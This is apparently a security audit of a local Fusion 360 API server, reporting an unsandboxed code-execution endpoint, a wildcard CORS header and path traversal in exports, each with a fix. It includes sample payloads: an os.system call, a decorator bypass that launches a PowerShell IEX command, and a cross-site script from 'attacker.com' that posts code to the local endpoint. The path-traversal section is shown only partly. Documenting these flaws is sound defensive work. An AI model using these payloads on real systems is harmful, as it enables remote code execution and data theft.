[1] ARBITRARY CODE EXECUTION via /execute Endpoint
    ─────────────────────────────────────────────
    Location: fusion360_api_server.py:197-210
    Impact: Remote Code Execution (RCE) in Fusion 360 context

    The server accepts raw Python code and executes it with NO sandbox:

        POST /execute HTTP/1.1
        Content-Type: application/json

        {"code": "import os; os.system('malware.exe')"}

    Attack Vectors (UNBLOCKABLE):
    • Direct exec() — no restrictions
    • Decorators — execute on class definition
    • Metaclasses — __new__/__init__ run during class creation
    • Type() function — dynamic class instantiation
    • __subclasses__() — access object hierarchy
    • __builtins__ — bypass local_ns restrictions

    Example Payload (Decorator Bypass):
    ──────────────────────────────────
    code = '''
    class Evil:
        def __init__(self):
            import os
            os.system("powershell.exe -Command IEX(New-Object...)")

    @Evil()
    def payload(): pass
    '''

    Fix: REMOVE /execute or implement AST-based whitelist + RestrictedPython


[2] OPEN CORS POLICY
    ───────────────────
    Location: fusion360_api_server.py:127

    Response Header: Access-Control-Allow-Origin: *

    Any website can make cross-origin requests to:
    • POST /execute → RCE
    • GET /tool-library/search → Exfiltrate 95K tools
    • DELETE /tool-library/... → Delete libraries

    Browser Attack Example:
    ──────────────────────
    <!-- attacker.com -->
    <script>
    fetch('http://localhost:18360/execute', {
        method: 'POST',
        body: JSON.stringify({
            code: 'import subprocess; subprocess.Popen(...)'
        })
    });
    </script>

    Fix: Change to:
    self.send_header("Access-Control-Allow-Origin", "http://localhost:3000")

    BETTER: Remove CORS headers entirely (same-origin only)


[3] PATH TRAVERSAL in /export Endpoint
    ───────────────────────────────────
    Location: fusion360_api_server.py:638-672

    Export path is NOT validated:

        POST /export HTTP/1.1

    • Startup folders (RCE on reboot)
    • System directories
    • Network shares
